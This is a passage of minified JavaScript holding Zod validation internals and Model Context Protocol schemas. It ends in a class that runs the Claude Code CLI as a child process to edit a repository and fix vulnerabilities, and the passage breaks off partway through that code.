W=Q.innerType._zod.run(J,Y);if(W instanceof Promise)return W.then((G)=>EN(G,X));return EN(W,X)}});Fr1=W1("$ZodCatch",(X,Q)=>{h0.init(X,Q),X._zod.optin="optional",f0(X._zod,"optout",()=>Q.innerType._zod.optout),f0(X._zod,"values",()=>Q.innerType._zod.values),X._zod.parse=(J,Y)=>{let W=Q.innerType._zod.run(J,Y);if(W instanceof Promise)return W.then((G)=>{if(J.value=G.value,G.issues.length)J.value=Q.catchValue({...J,error:{issues:G.issues.map((H)=>g8(H,Y,y8()))},input:J.value}),J.issues=[];return J});if(J.value=W.value,W.issues.length)J.value=Q.catchValue({...J,error:{issues:W.issues.map((G)=>g8(G,Y,y8()))},input:J.value}),J.issues=[];return J}}),Or1=W1("$ZodPipe",(X,Q)=>{h0.init(X,Q),f0(X._zod,"values",()=>Q.in._zod.values),f0(X._zod,"optin",()=>Q.in._zod.optin),f0(X._zod,"optout",()=>Q.out._zod.optout),X._zod.parse=(J,Y)=>{let W=Q.in._zod.run(J,Y);if(W instanceof Promise)return W.then((G)=>TN(G,Q,Y));return TN(W,Q,Y)}});Ar1=W1("$ZodReadonly",(X,Q)=>{h0.init(X,Q),f0(X._zod,"propValues",()=>Q.innerType._zod.propValues),f0(X._zod,"values",()=>Q.innerType._zod.values),f0(X._zod,"optin",()=>Q.innerType._zod.optin),f0(X._zod,"optout",()=>Q.innerType._zod.optout),X._zod.parse=(J,Y)=>{let W=Q.innerType._zod.run(J,Y);if(W instanceof Promise)return W.then(_N);return _N(W)}});Rr1=W1("$ZodCustom",(X,Q)=>{p9.init(X,Q),h0.init(X,Q),X._zod.parse=(J,Y)=>{return J},X._zod.check=(J)=>{let Y=J.value,W=Q.fn(Y);if(W instanceof Promise)return W.then((G)=>kN(G,J,Y,X));kN(W,J,Y,X);return}});bU0=Symbol("ZodOutput"),vU0=Symbol("ZodInput");HW=wr1();iw={};lN(iw,{time:()=>tw,duration:()=>XI,datetime:()=>nw,date:()=>ow,ZodISOTime:()=>sw,ZodISODuration:()=>ew,ZodISODateTime:()=>rw,ZodISODate:()=>aw});rw=W1("ZodISODateTime",(X,Q)=>{gi1.init(X,Q),p0.init(X,Q)});aw=W1("ZodISODate",(X,Q)=>{mi1.init(X,Q),p0.init(X,Q)});sw=W1("ZodISOTime",(X,Q)=>{ui1.init(X,Q),p0.init(X,Q)});ew=W1("ZodISODuration",(X,Q)=>{ci1.init(X,Q),p0.init(X,Q)});xU0=W1("ZodError",QI),bW=W1("ZodError",QI,{Parent:Error}),jn1=hd1(bW),Fn1=yd1(bW),On1=_w(bW),An1=kw(bW),l0=W1("ZodType",(X,Q)=>{return h0.init(X,Q),X.def=Q,Object.defineProperty(X,"_def",{value:Q}),X.check=(...J)=>{return X.clone({...Q,checks:[...Q.checks??[],...J.map((Y)=>typeof Y==="function"?{_zod:{check:Y,def:{check:"custom"},onattach:[]}}:Y)]})},X.clone=(J,Y)=>CX(X,J,Y),X.brand=()=>X,X.register=(J,Y)=>{return J.add(X,Y),X},X.parse=(J,Y)=>jn1(X,J,Y,{callee:X.parse}),X.safeParse=(J,Y)=>On1(X,J,Y),X.parseAsync=async(J,Y)=>Fn1(X,J,Y,{callee:X.parseAsync}),X.safeParseAsync=async(J,Y)=>An1(X,J,Y),X.spa=X.safeParseAsync,X.refine=(J,Y)=>X.check(Ua1(J,Y)),X.superRefine=(J)=>X.check(Ka1(J)),X.overwrite=(J)=>X.check(yQ(J)),X.optional=()=>g1(X),X.nullable=()=>gN(X),X.nullish=()=>g1(gN(X)),X.nonoptional=(J)=>Qa1(X,J),X.array=()=>A0(X),X.or=(J)=>u0([X,J]),X.and=(J)=>BK(X,J),X.transform=(J)=>XK(X,zI(J)),X.default=(J)=>tn1(X,J),X.prefault=(J)=>Xa1(X,J),X.catch=(J)=>Ya1(X,J),X.pipe=(J)=>XK(X,J),X.readonly=()=>Ha1(X),X.describe=(J)=>{let Y=X.clone();return HW.add(Y,{description:J}),Y},Object.defineProperty(X,"description",{get(){return HW.get(X)?.description},configurable:!0}),X.meta=(...J)=>{if(J.length===0)return HW.get(X);let Y=X.clone();return HW.add(Y,J[0]),Y},X.isOptional=()=>X.safeParse(void 0).success,X.isNullable=()=>X.safeParse(null).success,X}),JI=W1("_ZodString",(X,Q)=>{VK.init(X,Q),l0.init(X,Q);let J=X._zod.bag;X.format=J.format??null,X.minLength=J.minimum??null,X.maxLength=J.maximum??null,X.regex=(...Y)=>X.check(Yn1(...Y)),X.includes=(...Y)=>X.check(Hn1(...Y)),X.startsWith=(...Y)=>X.check($n1(...Y)),X.endsWith=(...Y)=>X.check(zn1(...Y)),X.min=(...Y)=>X.check(AW(...Y)),X.max=(...Y)=>X.check(pw(...Y)),X.length=(...Y)=>X.check(dw(...Y)),X.nonempty=(...Y)=>X.check(AW(1,...Y)),X.lowercase=(Y)=>X.check(Wn1(Y)),X.uppercase=(Y)=>X.check(Gn1(Y)),X.trim=()=>X.check(Kn1()),X.normalize=(...Y)=>X.check(Un1(...Y)),X.toLowerCase=()=>X.check(Vn1()),X.toUpperCase=()=>X.check(Bn1())}),Rn1=W1("ZodString",(X,Q)=>{VK.init(X,Q),JI.init(X,Q),X.email=(J)=>X.check(Cr1(Ln1,J)),X.url=(J)=>X.check(_r1(Dn1,J)),X.jwt=(J)=>X.check(ir1(hn1,J)),X.emoji=(J)=>X.check(kr1(Nn1,J)),X.guid=(J)=>X.check(bN(hN,J)),X.uuid=(J)=>X.check(Pr1($W,J)),X.uuidv4=(J)=>X.check(Sr1($W,J)),X.uuidv6=(J)=>X.check(Er1($W,J)),X.uuidv7=(J)=>X.check(Tr1($W,J)),X.nanoid=(J)=>X.check(br1(wn1,J)),X.guid=(J)=>X.check(bN(hN,J)),X.cuid=(J)=>X.check(vr1(In1,J)),X.cuid2=(J)=>X.check(xr1(Cn1,J)),X.ulid=(J)=>X.check(fr1(Pn1,J)),X.base64=(J)=>X.check(lr1(vn1,J)),X.base64url=(J)=>X.check(pr1(xn1,J)),X.xid=(J)=>X.check(hr1(Sn1,J)),X.ksuid=(J)=>X.check(yr1(En1,J)),X.ipv4=(J)=>X.check(gr1(Tn1,J)),X.ipv6=(J)=>X.check(mr1(_n1,J)),X.cidrv4=(J)=>X.check(ur1(kn1,J)),X.cidrv6=(J)=>X.check(cr1(bn1,J)),X.e164=(J)=>X.check(dr1(fn1,J)),X.datetime=(J)=>X.check(nw(J)),X.date=(J)=>X.check(ow(J)),X.time=(J)=>X.check(tw(J)),X.duration=(J)=>X.check(XI(J))});p0=W1("ZodStringFormat",(X,Q)=>{m0.init(X,Q),JI.init(X,Q)}),Ln1=W1("ZodEmail",(X,Q)=>{Ti1.init(X,Q),p0.init(X,Q)}),hN=W1("ZodGUID",(X,Q)=>{Si1.init(X,Q),p0.init(X,Q)}),$W=W1("ZodUUID",(X,Q)=>{Ei1.init(X,Q),p0.init(X,Q)}),Dn1=W1("ZodURL",(X,Q)=>{_i1.init(X,Q),p0.init(X,Q)}),Nn1=W1("ZodEmoji",(X,Q)=>{ki1.init(X,Q),p0.init(X,Q)}),wn1=W1("ZodNanoID",(X,Q)=>{bi1.init(X,Q),p0.init(X,Q)}),In1=W1("ZodCUID",(X,Q)=>{vi1.init(X,Q),p0.init(X,Q)}),Cn1=W1("ZodCUID2",(X,Q)=>{xi1.init(X,Q),p0.init(X,Q)}),Pn1=W1("ZodULID",(X,Q)=>{fi1.init(X,Q),p0.init(X,Q)}),Sn1=W1("ZodXID",(X,Q)=>{hi1.init(X,Q),p0.init(X,Q)}),En1=W1("ZodKSUID",(X,Q)=>{yi1.init(X,Q),p0.init(X,Q)}),Tn1=W1("ZodIPv4",(X,Q)=>{li1.init(X,Q),p0.init(X,Q)}),_n1=W1("ZodIPv6",(X,Q)=>{pi1.init(X,Q),p0.init(X,Q)}),kn1=W1("ZodCIDRv4",(X,Q)=>{di1.init(X,Q),p0.init(X,Q)}),bn1=W1("ZodCIDRv6",(X,Q)=>{ii1.init(X,Q),p0.init(X,Q)}),vn1=W1("ZodBase64",(X,Q)=>{ri1.init(X,Q),p0.init(X,Q)}),xn1=W1("ZodBase64URL",(X,Q)=>{ai1.init(X,Q),p0.init(X,Q)}),fn1=W1("ZodE164",(X,Q)=>{oi1.init(X,Q),p0.init(X,Q)}),hn1=W1("ZodJWT",(X,Q)=>{ti1.init(X,Q),p0.init(X,Q)}),YI=W1("ZodNumber",(X,Q)=>{uw.init(X,Q),l0.init(X,Q),X.gt=(Y,W)=>X.check(xN(Y,W)),X.gte=(Y,W)=>X.check(pU(Y,W)),X.min=(Y,W)=>X.check(pU(Y,W)),X.lt=(Y,W)=>X.check(vN(Y,W)),X.lte=(Y,W)=>X.check(lU(Y,W)),X.max=(Y,W)=>X.check(lU(Y,W)),X.int=(Y)=>X.check(yN(Y)),X.safe=(Y)=>X.check(yN(Y)),X.positive=(Y)=>X.check(xN(0,Y)),X.nonnegative=(Y)=>X.check(pU(0,Y)),X.negative=(Y)=>X.check(vN(0,Y)),X.nonpositive=(Y)=>X.check(lU(0,Y)),X.multipleOf=(Y,W)=>X.check(fN(Y,W)),X.step=(Y,W)=>X.check(fN(Y,W)),X.finite=()=>X;let J=X._zod.bag;X.minValue=Math.max(J.minimum??Number.NEGATIVE_INFINITY,J.exclusiveMinimum??Number.NEGATIVE_INFINITY)??null,X.maxValue=Math.min(J.maximum??Number.POSITIVE_INFINITY,J.exclusiveMaximum??Number.POSITIVE_INFINITY)??null,X.isInt=(J.format??"").includes("int")||Number.isSafeInteger(J.multipleOf??0.5),X.isFinite=!0,X.format=J.format??null});yn1=W1("ZodNumberFormat",(X,Q)=>{ei1.init(X,Q),YI.init(X,Q)});gn1=W1("ZodBoolean",(X,Q)=>{Xr1.init(X,Q),l0.init(X,Q)});mn1=W1("ZodNull",(X,Q)=>{Qr1.init(X,Q),l0.init(X,Q)});un1=W1("ZodUnknown",(X,Q)=>{Jr1.init(X,Q),l0.init(X,Q)});cn1=W1("ZodNever",(X,Q)=>{Yr1.init(X,Q),l0.init(X,Q)});pn1=W1("ZodArray",(X,Q)=>{Wr1.init(X,Q),l0.init(X,Q),X.element=Q.element,X.min=(J,Y)=>X.check(AW(J,Y)),X.nonempty=(J)=>X.check(AW(1,J)),X.max=(J,Y)=>X.check(pw(J,Y)),X.length=(J,Y)=>X.check(dw(J,Y)),X.unwrap=()=>X.element});GI=W1("ZodObject",(X,Q)=>{Gr1.init(X,Q),l0.init(X,Q),x0.defineLazy(X,"shape",()=>Q.shape),X.keyof=()=>D9(Object.keys(X._zod.def.shape)),X.catchall=(J)=>X.clone({...X._zod.def,catchall:J}),X.passthrough=()=>X.clone({...X._zod.def,catchall:G9()}),X.loose=()=>X.clone({...X._zod.def,catchall:G9()}),X.strict=()=>X.clone({...X._zod.def,catchall:ln1()}),X.strip=()=>X.clone({...X._zod.def,catchall:void 0}),X.extend=(J)=>{return x0.extend(X,J)},X.merge=(J)=>x0.merge(X,J),X.pick=(J)=>x0.pick(X,J),X.omit=(J)=>x0.omit(X,J),X.partial=(...J)=>x0.partial(UI,X,J[0]),X.required=(...J)=>x0.required(KI,X,J[0])});HI=W1("ZodUnion",(X,Q)=>{cw.init(X,Q),l0.init(X,Q),X.options=Q.options});dn1=W1("ZodDiscriminatedUnion",(X,Q)=>{HI.init(X,Q),Hr1.init(X,Q)});in1=W1("ZodIntersection",(X,Q)=>{$r1.init(X,Q),l0.init(X,Q)});rn1=W1("ZodRecord",(X,Q)=>{zr1.init(X,Q),l0.init(X,Q),X.keyType=Q.keyType,X.valueType=Q.valueType});eU=W1("ZodEnum",(X,Q)=>{Ur1.init(X,Q),l0.init(X,Q),X.enum=Q.entries,X.options=Object.values(Q.entries);let J=new Set(Object.keys(Q.entries));X.extract=(Y,W)=>{let G={};for(let H of Y)if(J.has(H))G[H]=Q.entries[H];else throw Error(`Key ${H} not found in enum`);return new eU({...Q,checks:[],...x0.normalizeParams(W),entries:G})},X.exclude=(Y,W)=>{let G={...Q.entries};for(let H of Y)if(J.has(H))delete G[H];else throw Error(`Key ${H} not found in enum`);return new eU({...Q,checks:[],...x0.normalizeParams(W),entries:G})}});nn1=W1("ZodLiteral",(X,Q)=>{Kr1.init(X,Q),l0.init(X,Q),X.values=new Set(Q.values),Object.defineProperty(X,"value",{get(){if(Q.values.length>1)throw Error("This schema contains multiple valid literal values. Use `.values` instead.");return Q.values[0]}})});an1=W1("ZodTransform",(X,Q)=>{Vr1.init(X,Q),l0.init(X,Q),X._zod.parse=(J,Y)=>{J.addIssue=(G)=>{if(typeof G==="string")J.issues.push(x0.issue(G,J.value,Q));else{let H=G;if(H.fatal)H.continue=!1;H.code??(H.code="custom"),H.input??(H.input=J.value),H.inst??(H.inst=X),H.continue??(H.continue=!0),J.issues.push(x0.issue(H))}};let W=Q.transform(J.value,J);if(W instanceof Promise)return W.then((G)=>{return J.value=G,J});return J.value=W,J}});UI=W1("ZodOptional",(X,Q)=>{Br1.init(X,Q),l0.init(X,Q),X.unwrap=()=>X._zod.def.innerType});on1=W1("ZodNullable",(X,Q)=>{qr1.init(X,Q),l0.init(X,Q),X.unwrap=()=>X._zod.def.innerType});sn1=W1("ZodDefault",(X,Q)=>{Zr1.init(X,Q),l0.init(X,Q),X.unwrap=()=>X._zod.def.innerType,X.removeDefault=X.unwrap});en1=W1("ZodPrefault",(X,Q)=>{Mr1.init(X,Q),l0.init(X,Q),X.unwrap=()=>X._zod.def.innerType});KI=W1("ZodNonOptional",(X,Q)=>{jr1.init(X,Q),l0.init(X,Q),X.unwrap=()=>X._zod.def.innerType});Ja1=W1("ZodCatch",(X,Q)=>{Fr1.init(X,Q),l0.init(X,Q),X.unwrap=()=>X._zod.def.innerType,X.removeCatch=X.unwrap});Wa1=W1("ZodPipe",(X,Q)=>{Or1.init(X,Q),l0.init(X,Q),X.in=Q.in,X.out=Q.out});Ga1=W1("ZodReadonly",(X,Q)=>{Ar1.init(X,Q),l0.init(X,Q)});VI=W1("ZodCustom",(X,Q)=>{Rr1.init(X,Q),l0.init(X,Q)});y8(Nr1());G8=za1((X)=>X!==null&&(typeof X==="object"||typeof X==="function")),qI=u0([J1(),_0().int()]),ZI=J1(),Va1=v6({ttl:u0([_0(),WI()]).optional(),pollInterval:_0().optional()}),ZK=v6({taskId:J1()}),Ba1=v6({progressToken:qI.optional(),[qK]:ZK.optional()}),d9=v6({task:Va1.optional(),_meta:Ba1.optional()}),q9=A1({method:J1(),params:d9.optional()}),M7=v6({_meta:A1({[qK]:g1(ZK)}).passthrough().optional()}),V6=A1({method:J1(),params:M7.optional()}),N9=v6({_meta:v6({[qK]:ZK.optional()}).optional()}),xW=u0([J1(),_0().int()]),qa1=A1({jsonrpc:m1(vW),id:xW,...q9.shape}).strict(),Za1=A1({jsonrpc:m1(vW),...V6.shape}).strict(),Ma1=A1({jsonrpc:m1(vW),id:xW,result:N9}).strict();(function(X){X[X.ConnectionClosed=-32000]="ConnectionClosed",X[X.RequestTimeout=-32001]="RequestTimeout",X[X.ParseError=-32700]="ParseError",X[X.InvalidRequest=-32600]="InvalidRequest",X[X.MethodNotFound=-32601]="MethodNotFound",X[X.InvalidParams=-32602]="InvalidParams",X[X.InternalError=-32603]="InternalError",X[X.UrlElicitationRequired=-32042]="UrlElicitationRequired"})(mN||(mN={}));ja1=A1({jsonrpc:m1(vW),id:xW,error:A1({code:_0().int(),message:J1(),data:g1(G9())})}).strict(),fU0=u0([qa1,Za1,Ma1,ja1]),MI=N9.strict(),Fa1=M7.extend({requestId:xW,reason:J1().optional()}),jI=V6.extend({method:m1("notifications/cancelled"),params:Fa1}),Oa1=A1({src:J1(),mimeType:J1().optional(),sizes:A0(J1()).optional()}),gQ=A1({icons:A0(Oa1).optional()}),h5=A1({name:J1(),title:J1().optional()}),FI=h5.extend({...h5.shape,...gQ.shape,version:J1(),websiteUrl:J1().optional()}),Aa1=BK(A1({applyDefaults:L9().optional()}),H9(J1(),G9())),Ra1=BI((X)=>{if(X&&typeof X==="object"&&!Array.isArray(X)){if(Object.keys(X).length===0)return{form:{}}}return X},BK(A1({form:Aa1.optional(),url:G8.optional()}),H9(J1(),G9()).optional())),La1=A1({list:g1(A1({}).passthrough()),cancel:g1(A1({}).passthrough()),requests:g1(A1({sampling:g1(A1({createMessage:g1(A1({}).passthrough())}).passthrough()),elicitation:g1(A1({create:g1(A1({}).passthrough())}).passthrough())}).passthrough())}).passthrough(),Da1=A1({list:g1(A1({}).passthrough()),cancel:g1(A1({}).passthrough()),requests:g1(A1({tools:g1(A1({call:g1(A1({}).passthrough())}).passthrough())}).passthrough())}).passthrough(),Na1=A1({experimental:H9(J1(),G8).optional(),sampling:A1({context:G8.optional(),tools:G8.optional()}).optional(),elicitation:Ra1.optional(),roots:A1({listChanged:L9().optional()}).optional(),tasks:g1(La1)}),wa1=d9.extend({protocolVersion:J1(),capabilities:Na1,clientInfo:FI}),Ia1=q9.extend({method:m1("initialize"),params:wa1}),Ca1=A1({experimental:H9(J1(),G8).optional(),logging:G8.optional(),completions:G8.optional(),prompts:g1(A1({listChanged:g1(L9())})),resources:A1({subscribe:L9().optional(),listChanged:L9().optional()}).optional(),tools:A1({listChanged:L9().optional()}).optional(),tasks:g1(Da1)}).passthrough(),Pa1=N9.extend({protocolVersion:J1(),capabilities:Ca1,serverInfo:FI,instructions:J1().optional()}),Sa1=V6.extend({method:m1("notifications/initialized")}),OI=q9.extend({method:m1("ping")}),Ea1=A1({progress:_0(),total:g1(_0()),message:g1(J1())}),Ta1=A1({...M7.shape,...Ea1.shape,progressToken:qI}),AI=V6.extend({method:m1("notifications/progress"),params:Ta1}),_a1=d9.extend({cursor:ZI.optional()}),mQ=q9.extend({params:_a1.optional()}),uQ=N9.extend({nextCursor:g1(ZI)}),cQ=A1({taskId:J1(),status:D9(["working","input_required","completed","failed","cancelled"]),ttl:u0([_0(),WI()]),createdAt:J1(),lastUpdatedAt:J1(),pollInterval:g1(_0()),statusMessage:g1(J1())}),RI=N9.extend({task:cQ}),ka1=M7.merge(cQ),LI=V6.extend({method:m1("notifications/tasks/status"),params:ka1}),DI=q9.extend({method:m1("tasks/get"),params:d9.extend({taskId:J1()})}),NI=N9.merge(cQ),wI=q9.extend({method:m1("tasks/result"),params:d9.extend({taskId:J1()})}),II=mQ.extend({method:m1("tasks/list")}),CI=uQ.extend({tasks:A0(cQ)}),hU0=q9.extend({method:m1("tasks/cancel"),params:d9.extend({taskId:J1()})}),yU0=N9.merge(cQ),PI=A1({uri:J1(),mimeType:g1(J1()),_meta:H9(J1(),G9()).optional()}),SI=PI.extend({text:J1()}),MK=J1().refine((X)=>{try{return atob(X),!0}catch(Q){return!1}},{message:"Invalid Base64 string"}),EI=PI.extend({blob:MK}),c5=A1({audience:A0(D9(["user","assistant"])).optional(),priority:_0().min(0).max(1).optional(),lastModified:iw.datetime({offset:!0}).optional()}),TI=A1({...h5.shape,...gQ.shape,uri:J1(),description:g1(J1()),mimeType:g1(J1()),annotations:c5.optional(),_meta:g1(v6({}))}),ba1=A1({...h5.shape,...gQ.shape,uriTemplate:J1(),description:g1(J1()),mimeType:g1(J1()),annotations:c5.optional(),_meta:g1(v6({}))}),va1=mQ.extend({method:m1("resources/list")}),xa1=uQ.extend({resources:A0(TI)}),fa1=mQ.extend({method:m1("resources/templates/list")}),ha1=uQ.extend({resourceTemplates:A0(ba1)}),jK=d9.extend({uri:J1()}),ya1=jK,ga1=q9.extend({method:m1("resources/read"),params:ya1}),ma1=N9.extend({contents:A0(u0([SI,EI]))}),ua1=V6.extend({method:m1("notifications/resources/list_changed")}),ca1=jK,la1=q9.extend({method:m1("resources/subscribe"),params:ca1}),pa1=jK,da1=q9.extend({method:m1("resources/unsubscribe"),params:pa1}),ia1=M7.extend({uri:J1()}),ra1=V6.extend({method:m1("notifications/resources/updated"),params:ia1}),na1=A1({name:J1(),description:g1(J1()),required:g1(L9())}),aa1=A1({...h5.shape,...gQ.shape,description:g1(J1()),arguments:g1(A0(na1)),_meta:g1(v6({}))}),oa1=mQ.extend({method:m1("prompts/list")}),sa1=uQ.extend({prompts:A0(aa1)}),ta1=d9.extend({name:J1(),arguments:H9(J1(),J1()).optional()}),ea1=q9.extend({method:m1("prompts/get"),params:ta1}),FK=A1({type:m1("text"),text:J1(),annotations:c5.optional(),_meta:H9(J1(),G9()).optional()}),OK=A1({type:m1("image"),data:MK,mimeType:J1(),annotations:c5.optional(),_meta:H9(J1(),G9()).optional()}),AK=A1({type:m1("audio"),data:MK,mimeType:J1(),annotations:c5.optional(),_meta:H9(J1(),G9()).optional()}),Xo1=A1({type:m1("tool_use"),name:J1(),id:J1(),input:A1({}).passthrough(),_meta:g1(A1({}).passthrough())}).passthrough(),Qo1=A1({type:m1("resource"),resource:u0([SI,EI]),annotations:c5.optional(),_meta:H9(J1(),G9()).optional()}),Jo1=TI.extend({type:m1("resource_link")}),RK=u0([FK,OK,AK,Jo1,Qo1]),Yo1=A1({role:D9(["user","assistant"]),content:RK}),Wo1=N9.extend({description:g1(J1()),messages:A0(Yo1)}),Go1=V6.extend({method:m1("notifications/prompts/list_changed")}),Ho1=A1({title:J1().optional(),readOnlyHint:L9().optional(),destructiveHint:L9().optional(),idempotentHint:L9().optional(),openWorldHint:L9().optional()}),$o1=A1({taskSupport:D9(["required","optional","forbidden"]).optional()}),_I=A1({...h5.shape,...gQ.shape,description:J1().optional(),inputSchema:A1({type:m1("object"),properties:H9(J1(),G8).optional(),required:A0(J1()).optional()}).catchall(G9()),outputSchema:A1({type:m1("object"),properties:H9(J1(),G8).optional(),required:A0(J1()).optional()}).catchall(G9()).optional(),annotations:g1(Ho1),execution:g1($o1),_meta:H9(J1(),G9()).optional()}),zo1=mQ.extend({method:m1("tools/list")}),Uo1=uQ.extend({tools:A0(_I)}),kI=N9.extend({content:A0(RK).default([]),structuredContent:H9(J1(),G9()).optional(),isError:g1(L9())}),gU0=kI.or(N9.extend({toolResult:G9()})),Ko1=d9.extend({name:J1(),arguments:g1(H9(J1(),G9()))}),Vo1=q9.extend({method:m1("tools/call"),params:Ko1}),Bo1=V6.extend({method:m1("notifications/tools/list_changed")}),bI=D9(["debug","info","notice","warning","error","critical","alert","emergency"]),qo1=d9.extend({level:bI}),Zo1=q9.extend({method:m1("logging/setLevel"),params:qo1}),Mo1=M7.extend({level:bI,logger:J1().optional(),data:G9()}),jo1=V6.extend({method:m1("notifications/message"),params:Mo1}),Fo1=A1({name:J1().optional()}),Oo1=A1({hints:g1(A0(Fo1)),costPriority:g1(_0().min(0).max(1)),speedPriority:g1(_0().min(0).max(1)),intelligencePriority:g1(_0().min(0).max(1))}),Ao1=A1({mode:g1(D9(["auto","required","none"]))}),Ro1=A1({type:m1("tool_result"),toolUseId:J1().describe("The unique identifier for the corresponding tool call."),content:A0(RK).default([]),structuredContent:A1({}).passthrough().optional(),isError:g1(L9()),_meta:g1(A1({}).passthrough())}).passthrough(),Lo1=$I("type",[FK,OK,AK]),RW=$I("type",[FK,OK,AK,Xo1,Ro1]),Do1=A1({role:D9(["user","assistant"]),content:u0([RW,A0(RW)]),_meta:g1(A1({}).passthrough())}).passthrough(),No1=d9.extend({messages:A0(Do1),modelPreferences:Oo1.optional(),systemPrompt:J1().optional(),includeContext:D9(["none","thisServer","allServers"]).optional(),temperature:_0().optional(),maxTokens:_0().int(),stopSequences:A0(J1()).optional(),metadata:G8.optional(),tools:g1(A0(_I)),toolChoice:g1(Ao1)}),wo1=q9.extend({method:m1("sampling/createMessage"),params:No1}),Io1=N9.extend({model:J1(),stopReason:g1(D9(["endTurn","stopSequence","maxTokens"]).or(J1())),role:D9(["user","assistant"]),content:Lo1}),Co1=N9.extend({model:J1(),stopReason:g1(D9(["endTurn","stopSequence","maxTokens","toolUse"]).or(J1())),role:D9(["user","assistant"]),content:u0([RW,A0(RW)])}),Po1=A1({type:m1("boolean"),title:J1().optional(),description:J1().optional(),default:L9().optional()}),So1=A1({type:m1("string"),title:J1().optional(),description:J1().optional(),minLength:_0().optional(),maxLength:_0().optional(),format:D9(["email","uri","date","date-time"]).optional(),default:J1().optional()}),Eo1=A1({type:D9(["number","integer"]),title:J1().optional(),description:J1().optional(),minimum:_0().optional(),maximum:_0().optional(),default:_0().optional()}),To1=A1({type:m1("string"),title:J1().optional(),description:J1().optional(),enum:A0(J1()),default:J1().optional()}),_o1=A1({type:m1("string"),title:J1().optional(),description:J1().optional(),oneOf:A0(A1({const:J1(),title:J1()})),default:J1().optional()}),ko1=A1({type:m1("string"),title:J1().optional(),description:J1().optional(),enum:A0(J1()),enumNames:A0(J1()).optional(),default:J1().optional()}),bo1=u0([To1,_o1]),vo1=A1({type:m1("array"),title:J1().optional(),description:J1().optional(),minItems:_0().optional(),maxItems:_0().optional(),items:A1({type:m1("string"),enum:A0(J1())}),default:A0(J1()).optional()}),xo1=A1({type:m1("array"),title:J1().optional(),description:J1().optional(),minItems:_0().optional(),maxItems:_0().optional(),items:A1({anyOf:A0(A1({const:J1(),title:J1()}))}),default:A0(J1()).optional()}),fo1=u0([vo1,xo1]),ho1=u0([ko1,bo1,fo1]),yo1=u0([ho1,Po1,So1,Eo1]),go1=d9.extend({mode:m1("form").optional(),message:J1(),requestedSchema:A1({type:m1("object"),properties:H9(J1(),yo1),required:A0(J1()).optional()})}),mo1=d9.extend({mode:m1("url"),message:J1(),elicitationId:J1(),url:J1().url()}),uo1=u0([go1,mo1]),co1=q9.extend({method:m1("elicitation/create"),params:uo1}),lo1=M7.extend({elicitationId:J1()}),po1=V6.extend({method:m1("notifications/elicitation/complete"),params:lo1}),do1=N9.extend({action:D9(["accept","decline","cancel"]),content:BI((X)=>X===null?void 0:X,H9(J1(),u0([J1(),_0(),L9(),A0(J1())])).optional())}),io1=A1({type:m1("ref/resource"),uri:J1()}),ro1=A1({type:m1("ref/prompt"),name:J1()}),no1=d9.extend({ref:u0([ro1,io1]),argument:A1({name:J1(),value:J1()}),context:A1({arguments:H9(J1(),J1()).optional()}).optional()}),ao1=q9.extend({method:m1("completion/complete"),params:no1}),oo1=N9.extend({completion:v6({values:A0(J1()).max(100),total:g1(_0().int()),hasMore:g1(L9())})}),so1=A1({uri:J1().startsWith("file://"),name:J1().optional(),_meta:H9(J1(),G9()).optional()}),to1=q9.extend({method:m1("roots/list")}),eo1=N9.extend({roots:A0(so1)}),Xs1=V6.extend({method:m1("notifications/roots/list_changed")}),mU0=u0([OI,Ia1,ao1,Zo1,ea1,oa1,va1,fa1,ga1,la1,da1,Vo1,zo1,DI,wI,II]),uU0=u0([jI,AI,Sa1,Xs1,LI]),cU0=u0([MI,Io1,Co1,do1,eo1,NI,CI,RI]),lU0=u0([OI,wo1,co1,to1,DI,wI,II]),pU0=u0([jI,AI,jo1,ra1,ua1,Bo1,Go1,LI,po1]),dU0=u0([MI,Pa1,oo1,Wo1,sa1,xa1,ha1,ma1,kI,Uo1,NI,CI,RI]),iU0=Symbol("Let zodToJsonSchema decide on which parser to use"),rU0=new Set("ABCDEFGHIJKLMNOPQRSTUVXYZabcdefghijklmnopqrstuvxyz0123456789"),nU0=cN(oN(),1),aU0=cN(Ac1(),1);(function(X){X.Completable="McpCompletable"})(uN||(uN={}))});import{spawn as Qs1}from"child_process";class LK{claudeConfig;repoPath;credentialManager;constructor(X,Q=process.cwd(),J){this.claudeConfig=X,this.repoPath=Q,this.credentialManager=J}async generateSolution(X,Q,J){try{V.info("Using Claude Code CLI for file editing...");let Y=process.env.ANTHROPIC_API_KEY;if(!Y&&this.credentialManager)try{if(Y=this.credentialManager.getCredential("anthropic"),Y)V.info("Using vended credentials for Claude Code CLI")}catch(U){V.warn("Failed to get vended credentials:",U)}if(!Y)return{success:!1,message:"CLI execution failed",error:"ANTHROPIC_API_KEY environment variable or vended credentials required for CLI approach"};let W=J||this.constructPrompt(X,Q);V.info(`Working directory: ${this.repoPath}`),V.info(`Prompt length: ${W.length} characters`);let G=await this.executeCLI(W,{cwd:this.repoPath,env:{...process.env,ANTHROPIC_API_KEY:Y}});if(!G.success)return{success:!1,message:G.error||"Claude Code CLI execution failed",error:G.error};let H=this.getModifiedFiles();if(H.length===0)return{success:!1,message:"No files were modified by Claude Code CLI",error:"Claude Code CLI did not make any file changes"};V.info(`Files modified by Claude Code CLI: ${H.join(", ")}`);let $={},z=G.output?.match(/```(?:json)?\s*(\{[\s\S]*?\})\s*```/);if(z)try{let U=JSON.parse(z[1]);if(U.files&&Array.isArray(U.files))U.files.forEach((K)=>{if(K.path&&K.changes)$[K.path]=K.changes})}catch(U){V.debug("Could not parse JSON from CLI output")}return{success:!0,message:`Successfully fixed vulnerabilities in ${H.length} file(s)`,changes:$,messages:[{type:"cli_output",content:G.output}]}}catch(Y){return V.error("Claude Code CLI execution failed:",Y),{success:!1,message:"CLI execution failed",error:Y instanceof Error?Y.message:String(Y)}}}executeCLI(X,Q){return new Promise((J)=>{let Y=setTimeout(()=>{if(V.warn("Claude CLI execution timed out after 20 minutes"),W&&!W.killed)W.kill("SIGTERM");J({success:!1,error:"Claude CLI execution timed out after 20 minutes"})},1200000),W,G=process.env.CLAUDE_MODEL?["--model",process.env.CLAUDE_MODEL]:[],H=[["claude",["--print","--permission-mode","acceptEdits",...G,"-"]],["bunx",["@anthropic-ai/claude-code","--print","--permission-mode","acceptEdits",...G,"-"]],["bun",["node_modules/@anthropic-ai/claude-code/cli.js","--print","--permission-mode","acceptEdits",...G,"-"]]],$=0,z=()=>{if($>=H.length){J({success:!1,error:"Could not find Claude Code CLI via bunx, bun, or global install"});return}let[U,K]=H[$];V.info(`Attempting: ${U} ${K.join(" ")}`),$++,W=Qs1(U,K,{...Q,stdio:["pipe","pipe","pipe"]}),W.stdin.write(X),W.stdin.end();let 